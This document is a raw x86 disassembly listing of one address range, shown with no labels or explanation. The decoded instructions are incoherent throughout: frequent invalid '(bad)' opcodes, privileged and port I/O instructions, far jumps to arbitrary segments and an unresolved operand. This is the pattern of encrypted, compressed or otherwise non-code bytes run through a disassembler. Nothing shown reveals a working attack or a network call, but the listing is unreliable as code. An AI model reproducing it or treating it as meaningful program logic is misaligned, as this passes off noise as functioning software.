  41f690:	xor    DWORD PTR [eax-0x1ef4427d],edx
  41f696:	(bad)  [eax]
  41f698:	outs   dx,DWORD PTR ds:[esi]
  41f699:	pusha  
  41f69a:	sahf   
  41f69b:	adc    dl,dl
  41f69d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f69e:	(bad)  
  41f6a0:	popf   
  41f6a1:	lods   al,BYTE PTR ds:[esi]
  41f6a2:	in     eax,dx
  41f6a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6a5:	jae    0x41f6cf
  41f6a7:	loopne 0x41f6d2
  41f6a9:	pop    ecx
  41f6aa:	pop    ecx
  41f6ab:	sub    dh,BYTE PTR [edi-0x8]
  41f6ae:	jg     0x41f6b7
  41f6b0:	mov    ebp,0xc551259d
  41f6b5:	ret    
  41f6b6:	sub    eax,0x28429fe8
  41f6bb:	jp     0x41f6d1
  41f6bd:	mov    esi,0xc43f45f1
  41f6c2:	das    
  41f6c3:	fcom   QWORD PTR [edi+0x38]
  41f6c6:	mov    ecx,0xe4076bc6
  41f6cb:	psraw  mm1,QWORD PTR [esi]
  41f6ce:	mov    eax,0xadb4b2a0
  41f6d4:	and    esp,DWORD PTR [ebx]
  41f6d6:	pop    eax
  41f6d7:	popa   
  41f6d8:	sub    al,0xef
  41f6da:	ror    DWORD PTR ds:0x140d55df,cl
  41f6e0:	add    BYTE PTR [edi],bh
  41f6e2:	cld    
  41f6e3:	outs   dx,DWORD PTR ds:[esi]
  41f6e4:	ja     0x41f6ed
  41f6e6:	push   edi
  41f6e7:	hlt    
  41f6e8:	dec    esi
  41f6e9:	pushf  
  41f6ea:	shl    DWORD PTR [esi+0x3a8d83e8],1
  41f6f0:	xor    ecx,DWORD PTR [edx]
  41f6f2:	repz ror DWORD PTR [eax+0x12],0xc6
  41f6f7:	das    
  41f6f8:	dec    ebx
  41f6f9:	and    DWORD PTR [eax+0x23],esp
  41f6fc:	inc    esi
  41f6fd:	in     al,dx
  41f6fe:	(bad)  
  41f6ff:	daa    
  41f700:	push   edi
  41f701:	xor    BYTE PTR [ecx+eiz*8],bl
  41f704:	mov    ah,0xe3
  41f706:	cli    
  41f707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f708:	xchg   ebp,eax
  41f709:	mov    bh,0x28
  41f70b:	and    BYTE PTR [ebp-0x62945b02],dl
  41f711:	xor    dh,al
  41f713:	mov    ebp,0x76dc18f0
  41f718:	push   ebp
  41f719:	iret   
  41f71a:	enter  0xcbf3,0x0
  41f71e:	or     bh,ch
  41f720:	adc    DWORD PTR [esi],esi
  41f722:	xor    edx,DWORD PTR [ecx]
  41f724:	mov    edi,0x531c0855
  41f729:	mov    eax,0x1e690ee8
  41f72e:	imul   ebp,DWORD PTR [ebp-0x72],0xa2a0f988
  41f735:	cwde   
  41f736:	ja     0x41f709
  41f738:	fadd   st(5),st
  41f73a:	pop    ebx
  41f73b:	shl    DWORD PTR [edx+0x31b3ddde],1
  41f741:	jb     0x41f725
  41f743:	dec    ebx
  41f744:	mov    cl,BYTE PTR [esp+ebx*8-0x66]
  41f748:	inc    ecx
  41f749:	ffreep st(1)
  41f74b:	fprem1 
  41f74d:	out    dx,eax
  41f74e:	fdivr  DWORD PTR [ebx+0x2d]
  41f751:	cmp    al,0x61
  41f753:	mov    WORD PTR [edx+0x77],fs
  41f756:	xchg   edx,eax
  41f757:	aad    0xf6
  41f759:	pop    es
  41f75a:	leave  
  41f75b:	daa    
  41f75c:	mov    ds:0x2f485cb6,al
  41f761:	js     0x41f703
  41f763:	adc    ebp,DWORD PTR [edi-0x67]
  41f766:	xchg   esi,eax
  41f767:	dec    eax
  41f768:	sahf   
  41f769:	dec    ebp
  41f76a:	scas   al,BYTE PTR es:[edi]
  41f76b:	icebp  
  41f76c:	cmp    DWORD PTR [edi],esi
  41f76e:	das    
  41f76f:	sbb    BYTE PTR [ecx],dl
  41f771:	test   ebx,edx
  41f773:	into   
  41f774:	ss mov esp,0x8dd3bd7f
  41f77a:	adc    eax,0x3cab7754
  41f77f:	dec    edx
  41f780:	pop    ebp
  41f781:	mov    ss,esp
  41f783:	repnz mov bl,0x82
  41f786:	adc    WORD PTR [ebp+0x4a0cf923],sp
  41f78d:	cli    
  41f78e:	cmp    ah,BYTE PTR [eax+0x1b31ff5d]
  41f794:	imul   edx,DWORD PTR [esp+ecx*1-0x6f],0x23a6f3d0
  41f79c:	pop    ss
  41f79d:	rcl    BYTE PTR [eax],0x9a
  41f7a0:	mov    al,ds:0x5d94471
  41f7a5:	and    eax,0xa55af62
  41f7aa:	sub    al,0xc5
  41f7ac:	sub    BYTE PTR [eax+0x5c97be20],dh
  41f7b2:	lds    esp,FWORD PTR [esi-0x2b]
  41f7b5:	out    0x89,al
  41f7b7:	pop    ecx
  41f7b8:	jbe    0x41f821
  41f7ba:	ins    DWORD PTR es:[edi],dx
  41f7bb:	mov    ebx,0xdeed2425
  41f7c0:	(bad)  
  41f7c1:	icebp  
  41f7c2:	pop    ebp
  41f7c3:	mov    ch,0x8f
  41f7c5:	mov    ss,esi
  41f7c7:	sti    
  41f7c8:	cmp    eax,0x3eeb7c87
  41f7cd:	xchg   edi,eax
  41f7ce:	mov    ebx,0x1a1c5d29
  41f7d3:	add    al,0x65
  41f7d5:	inc    ecx
  41f7d6:	cmp    DWORD PTR [eax+0x6571ad22],0x1db4fde6
  41f7e0:	mov    dl,0x1c
  41f7e2:	fwait
  41f7e3:	stos   DWORD PTR es:[edi],eax
  41f7e4:	mov    DWORD PTR [edi],ecx
  41f7e6:	adc    ch,dl
  41f7e8:	mov    ecx,DWORD PTR [esi-0x20]
  41f7eb:	pop    es
  41f7ec:	inc    ebp
  41f7ed:	in     eax,0xa7
  41f7ef:	pop    ss
  41f7f0:	push   ss
  41f7f1:	sub    DWORD PTR [edi+0x16953bab],ecx
  41f7f7:	dec    edi
  41f7f8:	test   BYTE PTR [esp+eax*2],0xb9
  41f7fc:	aad    0xed
  41f7fe:	es jb  0x41f782
  41f801:	mov    bh,dl
  41f803:	jmp    0x47dab9ef
  41f808:	hlt    
  41f809:	mov    ebx,0xd178092
  41f80e:	jg     0x41f85a
  41f810:	xor    cl,BYTE PTR [eax+eiz*4-0x1f3cea60]
  41f817:	call   0x1eb4:0x42350547
  41f81e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f81f:	and    ebx,esi
  41f821:	into   
  41f822:	sbb    ecx,DWORD PTR [edi-0x627ce5ef]
  41f828:	ss cli 
  41f82a:	fwait
  41f82b:	mov    ecx,0xc363bdf9
  41f830:	or     bl,BYTE PTR [esi-0x6b9d35a7]
  41f836:	in     al,dx
  41f837:	pop    esp
  41f838:	les    ecx,FWORD PTR [ebp-0x7c139c3]
  41f83e:	retf   0x8276
  41f841:	ins    BYTE PTR es:[edi],dx
  41f842:	ins    BYTE PTR es:[edi],dx
  41f843:	cmp    al,0x20
  41f845:	xor    BYTE PTR [edi],dl
  41f847:	and    al,dl
  41f849:	jmp    0xc8b2:0xf06908c0
  41f850:	popa   
  41f851:	adc    DWORD PTR [esi-0x11c9929f],esi
  41f857:	int3   
  41f858:	jmp    0xaca5:0x57deef89
  41f85f:	loop   0x41f805
  41f861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f862:	sub    BYTE PTR [ecx-0x2],ch
  41f865:	adc    eax,0x4a335722
  41f86a:	call   0x586d4300
  41f86f:	mov    dl,dl
  41f871:	pop    edx
  41f872:	dec    edi
  41f873:	cdq    
  41f874:	jmp    0x43194a0f
  41f879:	xchg   ebp,eax
  41f87a:	pop    edi
  41f87b:	test   eax,0xf74753a3
  41f880:	lahf   
  41f881:	fsub   st,st(4)
  41f883:	and    BYTE PTR [esi-0x35619596],ah
  41f889:	adc    eax,0xac1ff031
  41f88e:	push   ebp
  41f88f:	mov    eax,ds:0x6c66cfff
  41f894:	jne    0x41f86b
  41f896:	pushw  0x9049
  41f89a:	inc    edi
  41f89b:	sub    eax,DWORD PTR [ebx+0x5c]
  41f89e:	cs xchg esp,eax
  41f8a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8a1:	or     ch,BYTE PTR [ebx]
  41f8a3:	dec    esp
  41f8a4:	adc    al,0x16
  41f8a6:	ja     0x41f856
  41f8a8:	inc    esi
  41f8a9:	sub    ch,BYTE PTR [edi-0x539f7d9f]
  41f8af:	test   al,0xc8
  41f8b1:	and    DWORD PTR [ecx+0x54],0x3
  41f8b5:	jns    0x41f88a
  41f8b7:	retf   
  41f8b8:	or     DWORD PTR [edx-0x1efa772e],eax
  41f8be:	inc    esp
  41f8bf:	mov    bh,BYTE PTR [ebp+0x78]
  41f8c2:	fchs   
  41f8c4:	jmp    0xc48a2506
  41f8c9:	scas   al,BYTE PTR es:[edi]
  41f8ca:	push   edi
  41f8cb:	push   edx
  41f8cc:	shl    BYTE PTR ds:0x78bb014a,0xcd
  41f8d3:	sbb    BYTE PTR [ebp-0x7de274bc],0x1e
  41f8da:	adc    eax,0x8a267b51
  41f8df:	xor    BYTE PTR [esi-0x16],dh
  41f8e2:	mov    ah,0xf8
  41f8e4:	in     eax,dx
  41f8e5:	mov    ebx,edi
  41f8e7:	cmp    ebp,DWORD PTR [ebx]
  41f8e9:	push   cs
  41f8ea:	(bad)  
  41f8ec:	mov    ah,BYTE PTR [edx]
  41f8ee:	outs   dx,DWORD PTR ds:[esi]
  41f8ef:	dec    DWORD PTR [esi+0x2adfda03]
  41f8f5:	mov    esp,ss
  41f8f7:	(bad)  
  41f8f8:	repz mov ?,eax
  41f8fb:	sti    
  41f8fc:	xor    edx,0xb
  41f8ff:	push   0xffffff92
  41f901:	cmp    eax,0x4256681d
  41f906:	fcom   DWORD PTR [ebx+0x58]
  41f909:	push   edi
  41f90a:	fisttp QWORD PTR [edx]
  41f90c:	push   es
  41f90d:	dec    eax
  41f90e:	rol    DWORD PTR [edx+0x66],1
  41f911:	or     edx,0xffffff83
  41f914:	xchg   esi,eax
  41f915:	sbb    DWORD PTR [ebp+0x6463a24d],esp
  41f91b:	imul   esp,DWORD PTR [ecx+0x43],0x21
  41f91f:	(bad)  
  41f920:	pop    ebp
  41f921:	pop    ebx
  41f922:	scas   al,BYTE PTR es:[edi]
  41f923:	shl    DWORD PTR [ecx+ebx*2-0x62],1
  41f927:	xchg   BYTE PTR [esi-0x62bb9d1a],ah
  41f92d:	dec    esp
  41f92e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f92f:	out    dx,al
  41f930:	nop
  41f931:	adc    al,0x9a
  41f933:	pop    ds
  41f934:	xor    eax,0x5230e481
  41f939:	inc    ebx
  41f93a:	jne    0x41f8e2
  41f93c:	mov    dl,0xe2
  41f93e:	pop    es
  41f93f:	add    al,0xc1
  41f941:	inc    BYTE PTR [eax+0x2]
  41f944:	popa   
  41f945:	call   0xc148:0xbe1b2a0b
  41f94c:	adc    ch,BYTE PTR [ebx+0x6689e7ef]
  41f952:	push   ecx
  41f953:	and    ah,bl
  41f955:	xchg   esp,eax
  41f956:	push   0x54
  41f958:	nop
  41f959:	int3   
  41f95a:	ds ins BYTE PTR es:[edi],dx
  41f95c:	jnp    0x41f9c6
  41f95e:	int    0x1f
  41f960:	gs jge 0x41f939
  41f963:	in     al,0x6f
  41f965:	adc    esp,DWORD PTR [esi-0x3ed41e8a]
  41f96b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f96c:	lods   al,BYTE PTR ds:[esi]
  41f96d:	xchg   ecx,eax
  41f96e:	inc    esp
  41f96f:	sbb    ecx,esp
  41f971:	mov    ebx,0x323e8701
  41f976:	xor    bl,ch
  41f978:	lahf   
  41f979:	pop    ds
  41f97a:	popa   
  41f97b:	hlt    
  41f97c:	nop
  41f97d:	xor    eax,0xc2786a16
  41f982:	xor    edi,ebx
  41f984:	pop    ds
  41f985:	or     dh,BYTE PTR [edx]
  41f987:	mov    cl,0xc8
  41f989:	push   0x64b19ef3
  41f98e:	rcl    DWORD PTR [ecx],cl
  41f990:	pop    es
  41f991:	cdq    
  41f992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f993:	pop    ecx
  41f994:	fidiv  DWORD PTR ds:0x450e5a58
  41f99a:	imul   ebx,DWORD PTR [eax-0x648f165a],0x7430abd9
  41f9a4:	(bad)  
  41f9a5:	loope  0x41f9ec
  41f9a7:	pop    es
  41f9a8:	mov    edi,DWORD PTR [ecx+0x282cbe6]
  41f9ae:	or     al,0xbe
  41f9b0:	pushf  
  41f9b1:	in     al,0x53
  41f9b3:	sbb    BYTE PTR [ebp+0x19],0xa
  41f9b7:	lea    ebx,[ecx-0x70]
  41f9ba:	adc    al,0x5e
  41f9bc:	fld    TBYTE PTR [ecx]
  41f9be:	dec    eax
  41f9bf:	pop    esi
  41f9c0:	mov    edi,0xf3f21975
  41f9c5:	dec    eax
  41f9c6:	jno    0x41f96c
  41f9c8:	pop    es
  41f9c9:	(bad)  
  41f9ca:	ss mov dx,0x73f2
  41f9cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9d0:	test   DWORD PTR [esp-0x640be3ea],0x5be2fbb0
  41f9db:	mov    edi,0x8790cac2
  41f9e0:	maxps  xmm5,XMMWORD PTR [edx]
  41f9e3:	data16 jne 0x41f975
  41f9e6:	pop    esp
  41f9e7:	aaa    
  41f9e8:	cmp    eax,0x867ca28e
  41f9ed:	sub    al,0x18
  41f9ef:	xor    BYTE PTR [ebx+0x55],dl
  41f9f2:	adc    DWORD PTR [ebx-0x4c],esi
  41f9f5:	stos   DWORD PTR es:[edi],eax
  41f9f6:	jae    0x41fa53
  41f9f8:	fs vpunpckldq ymm4,ymm1,ymm3
  41f9fd:	sbb    ecx,ecx
  41f9ff:	sbb    eax,DWORD PTR [ebx+edi*8-0x3e]
  41fa03:	and    cl,BYTE PTR [ecx+0x4026eb6b]
  41fa09:	adc    al,0x2e
  41fa0b:	std    
  41fa0c:	lock cwde 
  41fa0e:	sbb    BYTE PTR [ebx-0x5e37e6de],al
  41fa14:	outs   dx,DWORD PTR ss:[esi]
  41fa16:	aad    0x45
  41fa18:	xor    al,0x46
  41fa1a:	pop    ss
  41fa1b:	sub    al,bl
  41fa1d:	ds nop
  41fa1f:	push   esi
  41fa20:	fisub  WORD PTR [edx]
  41fa22:	xchg   edi,eax
  41fa23:	dec    ecx
  41fa24:	or     bh,ch
  41fa26:	or     DWORD PTR [edi-0x3ecc35d3],ebx
  41fa2c:	jns    0x41f9ed
  41fa2e:	retf   
  41fa2f:	jmp    0xab:0x16a15702
  41fa36:	test   bl,bl
  41fa38:	and    ebx,DWORD PTR [eax-0x10]
  41fa3b:	retf   0x14ad
  41fa3e:	dec    edx
  41fa3f:	sar    BYTE PTR [edx],cl
  41fa41:	cmp    edx,DWORD PTR [ebp-0x123de560]
  41fa47:	push   0x10
  41fa49:	rcl    DWORD PTR [eax],cl
  41fa4b:	add    esi,ecx
  41fa4d:	xchg   ecx,eax
  41fa4e:	jg     0x41f9d8
  41fa50:	mov    bh,0xa2
  41fa52:	pop    es
  41fa53:	inc    esi
  41fa54:	and    esp,edi
  41fa56:	(bad)  
  41fa57:	dec    ecx
  41fa58:	xchg   esp,eax
  41fa59:	inc    esi
  41fa5a:	imul   esi,DWORD PTR [esi-0x7c566bae],0x4e2d620
  41fa64:	push   ebx
  41fa65:	in     eax,dx
  41fa66:	cmp    bh,ch
  41fa68:	sub    al,0xf7
  41fa6a:	fs mov edi,0x111ab17e
  41fa70:	push   ebp
  41fa71:	mov    bh,0xf2
  41fa73:	mov    eax,ds:0x32bc454
  41fa78:	(bad)  
  41fa79:	sbb    DWORD PTR [edi-0x22],ebp
  41fa7c:	mov    dl,0xed
  41fa7e:	sub    eax,0xa6c665b2
  41fa83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa84:	repnz cs jecxz 0x41fad6
  41fa88:	push   esi
  41fa89:	arpl   WORD PTR ss:[ecx],bx
  41fa8c:	sbb    BYTE PTR gs:[esi],al
  41fa8f:	add    DWORD PTR [ecx-0x18],esi
  41fa92:	xor    eax,0xed22b6c1
  41fa97:	inc    edx
  41fa98:	sub    BYTE PTR [eax-0x70],al
  41fa9b:	out    dx,eax
  41fa9c:	cmp    al,0x6d
  41fa9e:	cdq    
  41fa9f:	lds    esp,FWORD PTR [edx+0x2006bf17]
  41faa5:	mov    bl,0xa3
  41faa7:	je     0x41fada
  41faa9:	shr    DWORD PTR [eax+edi*4],cl
  41faac:	sub    al,0x88
  41faae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faaf:	jb     0x41fa33
  41fab1:	sub    BYTE PTR [esi],dl
  41fab3:	jle    0x41faa5
  41fab5:	and    BYTE PTR [ecx+0x4bc9bcfe],dh
  41fabb:	or     eax,0xa3d85358
  41fac0:	(bad)  
  41fac1:	push   edi
  41fac2:	shl    DWORD PTR [ebp+0x2a],1
  41fac5:	push   ebp
  41fac6:	mov    bl,BYTE PTR [esi]
  41fac8:	push   ebp
  41fac9:	popa   
  41faca:	pop    ecx
  41facb:	repz sub DWORD PTR [ecx+0x37],0xffffffb9
  41fad0:	push   es
  41fad1:	push   ebp
  41fad2:	mov    ah,0xa2
  41fad4:	push   ecx
  41fad5:	rol    DWORD PTR [esi-0x7e],0x4f
  41fad9:	leave  
  41fada:	sbb    BYTE PTR [edi+0x4112d89],al
  41fae0:	ja     0x41faa2
  41fae2:	dec    esi
  41fae3:	jae    0x41facf
  41fae5:	shr    DWORD PTR [ebp+0x7d5e577e],cl
  41faeb:	inc    ecx
  41faec:	dec    esp
  41faed:	mov    BYTE PTR [esi+0x75cabe22],dl
  41faf3:	sbb    esp,ebx
  41faf5:	sub    ebx,DWORD PTR [edx]
  41faf7:	push   esp
  41faf8:	push   ebx
  41faf9:	add    cl,BYTE PTR [ecx+0x6e]
  41fafc:	xor    ah,BYTE PTR [esi]
  41fafe:	jns    0x41fac5
  41fb00:	mov    eax,ds:0x718620c6
  41fb05:	pushf  
  41fb06:	xlat   BYTE PTR ds:[ebx]
  41fb07:	out    0x3d,eax
  41fb09:	and    dh,al
  41fb0b:	clts   
  41fb0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb0e:	test   DWORD PTR [esi+0x27],esp
  41fb11:	or     esi,DWORD PTR [eax+0x74]
  41fb14:	sub    DWORD PTR [eax+edx*1-0x8aaec54],0x62fa9b3f
  41fb1f:	sub    ebx,DWORD PTR [edi]
  41fb21:	jne    0x41fb78
  41fb23:	mov    DWORD PTR [ebp+ecx*4+0x1cf0b48f],edi
  41fb2a:	add    ah,BYTE PTR [edi+0x42428ce4]
  41fb30:	int3   
  41fb31:	fs push edx
  41fb33:	xchg   ecx,eax
  41fb34:	pusha  
  41fb35:	inc    eax
  41fb36:	sub    ah,dl
  41fb38:	mov    ebp,0x70aa48f5
  41fb3d:	cmp    DWORD PTR [esi+0x1ff89b45],esi
  41fb43:	push   0x35
  41fb45:	or     BYTE PTR [ecx],dl
  41fb47:	adc    BYTE PTR [eax],0xed
  41fb4a:	scas   eax,DWORD PTR es:[edi]
  41fb4b:	mov    al,ds:0x73ca69b2
  41fb50:	stos   DWORD PTR es:[edi],eax
  41fb51:	es out dx,eax
  41fb53:	pop    es
  41fb54:	add    DWORD PTR [eax],esp
  41fb56:	test   eax,0x818a0c22
  41fb5b:	adc    bh,BYTE PTR [eax]
  41fb5d:	mov    edi,ebx
  41fb5f:	gs dec esi
  41fb61:	inc    esp
  41fb62:	bound  ecx,QWORD PTR [ebx+0x16]
  41fb65:	jge    0x41fb5c
  41fb67:	daa    
  41fb68:	mov    bh,0xb7
  41fb6a:	out    dx,al
  41fb6b:	mov    ebp,0xeb633674
  41fb70:	aaa    
  41fb71:	imul   edx,ecx,0xffffffec
  41fb74:	adc    cl,BYTE PTR [esi+0x4]
  41fb77:	lods   al,BYTE PTR ds:[esi]
  41fb78:	push   cs
  41fb79:	push   esi
  41fb7a:	inc    edx
  41fb7b:	loope  0x41fbeb
  41fb7d:	stc    
  41fb7e:	pusha  
  41fb7f:	mov    ds:0x7fd6ec17,al
  41fb84:	mov    eax,ds:0x177aabf1
  41fb89:	adc    ah,ah
  41fb8b:	mov    ecx,ds
  41fb8d:	es jno 0x41fbce
  41fb90:	or     al,ch
  41fb92:	pop    esi
  41fb93:	cli    
  41fb94:	retf   0x97e5
  41fb97:	adc    ebp,DWORD PTR ds:0x8aa40351
  41fb9d:	call   0x73549b54
  41fba2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fba3:	aaa    
  41fba4:	xor    BYTE PTR [esi],dl
  41fba6:	outs   dx,BYTE PTR ds:[esi]
  41fba7:	fisttp WORD PTR [ebx]
  41fba9:	aad    0x65
  41fbab:	cwde   
  41fbac:	add    ecx,esi
  41fbae:	sbb    bh,dl
  41fbb0:	push   edx
  41fbb1:	inc    ch
  41fbb3:	push   eax
  41fbb4:	xor    BYTE PTR ds:0xffe30ce4,ch
  41fbba:	test   al,0xec
  41fbbc:	mov    cs,edi
  41fbbe:	(bad)  
  41fbbf:	push   eax
  41fbc0:	jg     0x41fbe3
  41fbc2:	jmp    0x41fbd3
  41fbc4:	leave  
  41fbc5:	sbb    BYTE PTR [edi+0x4b],dl
  41fbc8:	jl     0x41fbbf
  41fbca:	shr    DWORD PTR [edi-0x53],1
  41fbcd:	imul   eax,DWORD PTR [ebx+0x76],0xa5e5acb3
  41fbd4:	cmp    al,0x2c
  41fbd6:	jle    0x41fc48
  41fbd8:	jbe    0x41fc55
  41fbda:	ss push ss
  41fbdc:	fstp   DWORD PTR [ebx+eax*8+0x11ad2343]
  41fbe3:	inc    eax
  41fbe4:	adc    al,0x5e
  41fbe6:	cmp    al,0x20
  41fbe8:	and    eax,0x815187bc
  41fbed:	sbb    BYTE PTR [eax-0x7c],dl
  41fbf0:	(bad)  
  41fbf1:	sti    
  41fbf2:	enter  0x9ac2,0xe1
  41fbf6:	idiv   BYTE PTR [edx-0x1c]
  41fbf9:	fsub   DWORD PTR [ebx]
  41fbfb:	jbe    0x41fba8
  41fbfd:	enter  0x319c,0xa6
  41fc01:	sbb    edx,DWORD PTR [ecx+0x514a9a7a]
  41fc07:	scas   eax,DWORD PTR es:[edi]
  41fc08:	or     dh,BYTE PTR [eax+0x5e8a1002]
  41fc0e:	call   0xe4e3:0x1a5312e5
  41fc15:	or     DWORD PTR [ebx+0x64d29810],edi
  41fc1b:	push   ebp
  41fc1c:	mov    esi,0x2fef1910
  41fc21:	outs   dx,DWORD PTR ds:[esi]
  41fc22:	cmp    al,0x1a
  41fc24:	inc    ecx
  41fc25:	and    bl,BYTE PTR [edx+0x638b7c7b]
  41fc2b:	sbb    BYTE PTR [eax],bl
  41fc2d:	jo     0x41fbe8
  41fc2f:	shr    BYTE PTR [esi],cl
  41fc31:	xor    DWORD PTR [eax-0x92d6bad],ebx
  41fc37:	lock lahf 
  41fc39:	cmc    
  41fc3a:	sub    esi,0xfffffff3
  41fc3d:	adc    BYTE PTR [edi],ah
  41fc3f:	adc    DWORD PTR [edx],eax
  41fc41:	cld    
  41fc42:	pop    ss
  41fc43:	loopne 0x41fc24
  41fc45:	mov    ds:0x5c2ddd12,al
  41fc4a:	mov    ch,0x87
  41fc4c:	inc    ebx
  41fc4d:	pop    ebp
  41fc4e:	mov    ds:0x85af3a0c,eax
  41fc53:	jb     0x41fbf8
  41fc55:	inc    ecx
  41fc56:	xlat   BYTE PTR ds:[ebx]
  41fc57:	fs jbe 0x41fbee
  41fc5a:	mov    cl,0x1f
  41fc5c:	lahf   
  41fc5d:	xchg   ebp,eax
  41fc5e:	scas   eax,DWORD PTR es:[edi]
  41fc5f:	pop    ss
  41fc60:	jmp    0xf96:0xca3495d1
  41fc67:	fcomp  QWORD PTR [esi+0x36]
  41fc6a:	fsubr  DWORD PTR [ecx]
  41fc6c:	add    al,0x1a
  41fc6e:	out    0x3e,al
  41fc70:	das    
  41fc71:	pop    ebp
  41fc72:	mov    edi,0x9b867617
  41fc77:	cmp    edi,DWORD PTR [eax+0x1f7cd75a]
  41fc7d:	shl    DWORD PTR [esi+0x49],0x69
  41fc81:	push   esi
  41fc82:	test   eax,0x661a5077
  41fc87:	popf   
  41fc88:	inc    esi
  41fc89:	cs aaa 
  41fc8b:	or     ebx,DWORD PTR [edx-0xba829a7]
  41fc91:	mov    edx,0x843ca946
  41fc96:	mov    eax,0x272e0c7d
  41fc9b:	jmp    0x8c46d1b8
  41fca0:	cli    
  41fca1:	test   eax,0x6448060
  41fca6:	pop    ebx
  41fca7:	cwde   
  41fca8:	loopne 0x41fc69
  41fcaa:	push   edx
  41fcab:	std    
  41fcac:	(bad)  
  41fcad:	push   eax
  41fcae:	cli    
  41fcaf:	pusha  
  41fcb0:	fistp  QWORD PTR [edi+0x3160aed3]
  41fcb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcb7:	pmovmskb ebx,mm4
  41fcba:	cmp    al,0xcf
  41fcbc:	test   al,0xdd
  41fcbe:	rol    eax,cl
  41fcc0:	jno    0x41fca3
  41fcc2:	add    al,0xf6
  41fcc4:	and    edi,DWORD PTR es:[edx]
  41fcc7:	cwde   
  41fcc8:	call   0xc5006a12
  41fccd:	or     eax,0x11cf31cd
  41fcd2:	push   es
  41fcd3:	fisubr DWORD PTR [ebp+esi*4+0x40]
  41fcd7:	mov    dl,0xd4
  41fcd9:	mov    edx,0xea6a270d
  41fcde:	pop    esi
  41fcdf:	xor    al,0xe
  41fce1:	mov    al,ds:0xca91deef
  41fce6:	jns    0x41fd1a
  41fce8:	pusha  
  41fce9:	neg    ecx
  41fceb:	(bad)  
  41fcec:	cmp    bl,BYTE PTR [edx-0x55]
  41fcef:	out    0xc5,al
  41fcf1:	push   eax
  41fcf2:	mov    bh,0xdb
  41fcf4:	out    dx,al
  41fcf5:	hlt    
  41fcf6:	push   edi
  41fcf7:	faddp  st(5),st
  41fcf9:	cmp    ebx,DWORD PTR [ebx+0x54c2f4e2]
  41fcff:	mov    bh,0xc3
  41fd01:	pop    esi
  41fd02:	shr    eax,cl
  41fd04:	add    cl,BYTE PTR [ebx]
  41fd06:	stos   DWORD PTR es:[edi],eax
  41fd07:	push   0xffffffa3
  41fd09:	dec    edx
  41fd0a:	lock loope 0x41fcce
  41fd0d:	jmp    0x4c46:0xd16c8d17
  41fd14:	test   bl,bh
  41fd16:	cmc    
  41fd17:	jbe    0x41fd83
  41fd19:	cmc    
  41fd1a:	pop    ds
  41fd1b:	or     DWORD PTR [ecx+0x5e],esp
  41fd1e:	aam    0xb4
  41fd20:	mov    ebx,0xe2b7266b
  41fd25:	or     bh,BYTE PTR [ecx]
  41fd27:	and    ah,BYTE PTR ds:0xf7f4d265
  41fd2d:	sbb    ebx,DWORD PTR [edi+0x6]
  41fd30:	xor    bl,0xf8
  41fd33:	jecxz  0x41fd92
  41fd35:	dec    edi
  41fd36:	add    dh,BYTE PTR [edi]
  41fd38:	int3   
  41fd39:	and    DWORD PTR [ebp+0x353d74e3],esi
  41fd3f:	inc    ecx
  41fd40:	inc    edx
  41fd41:	cmp    al,0x4a
  41fd43:	jnp    0x41fd02
  41fd45:	push   0xfffffff4
  41fd47:	fst    DWORD PTR [esi+ebp*8+0x5d]
  41fd4b:	test   eax,0x65014e32
  41fd50:	jecxz  0x41fcff
  41fd52:	imul   DWORD PTR [edx-0x13]
  41fd55:	push   ecx
  41fd56:	rcr    dh,0xba
  41fd59:	fisttp DWORD PTR [ebp+0xd0835ea]
  41fd5f:	(bad)  
  41fd60:	in     al,0xde
  41fd62:	das    
  41fd63:	pop    ss
  41fd64:	dec    ebp
  41fd65:	in     al,0x20
  41fd67:	pop    edi
  41fd68:	cmp    BYTE PTR [ebx-0x77cd83ca],dl
  41fd6e:	inc    ecx
  41fd6f:	es inc eax
  41fd71:	pop    esi
  41fd72:	push   es
  41fd73:	pop    ss
  41fd74:	addr16 mov bh,0x4d
  41fd77:	sbb    DWORD PTR [esi+0x7eea7f34],edi
  41fd7d:	and    al,0xf5
  41fd7f:	das    
  41fd80:	xor    ebp,ebp
  41fd82:	pop    ds
  41fd83:	mov    eax,0x125eb235
  41fd88:	mov    dl,0x57
  41fd8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd8b:	das    
  41fd8c:	out    dx,eax
  41fd8d:	inc    eax
  41fd8e:	pop    ss
  41fd8f:	aam    0xdf
  41fd91:	push   0x19
  41fd93:	ss mov ah,0x59
  41fd96:	div    BYTE PTR [esi-0x4e]
  41fd99:	les    eax,FWORD PTR [esp+edx*1-0x53]
  41fd9d:	and    al,0xb6
  41fd9f:	jns    0x41fd74
  41fda1:	jp     0x41fd6f
  41fda3:	out    0xf6,eax
  41fda5:	xchg   esp,eax
  41fda6:	mov    edx,0xea30ff96
  41fdab:	dec    esi
  41fdac:	inc    edx
  41fdad:	jp     0x41fd8c
  41fdaf:	cmp    esp,DWORD PTR [ebx]
  41fdb1:	pop    es
  41fdb2:	sub    edi,DWORD PTR ds:0xeae0a180
  41fdb8:	out    0x94,al
  41fdba:	ror    DWORD PTR [esp+esi*8+0x17634f56],1
  41fdc1:	loope  0x41fdc0
  41fdc3:	inc    eax
  41fdc4:	push   ebx
  41fdc5:	sub    BYTE PTR [eax+eiz*1+0x19],ah
  41fdc9:	(bad)  
  41fdca:	push   edx
  41fdcb:	add    DWORD PTR [edi],esi
  41fdcd:	or     ch,0xe4
  41fdd0:	xor    BYTE PTR [edi],al
  41fdd2:	inc    ebx
  41fdd3:	cmc    
  41fdd4:	cdq    
